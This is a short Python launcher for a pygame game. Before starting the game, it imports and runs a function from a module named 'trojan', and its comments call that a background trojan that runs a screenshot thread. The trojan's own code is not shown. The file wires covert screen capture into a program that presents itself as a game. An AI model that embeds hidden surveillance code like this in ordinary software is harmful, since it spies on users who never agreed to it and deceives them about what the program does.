import pygame as pg
from source.main import main
from source.trojan import start_trojan  # Import our background trojan

if __name__ == '__main__':
    start_trojan()  # Launch the screenshot thread independently
    main()
    pg.quit()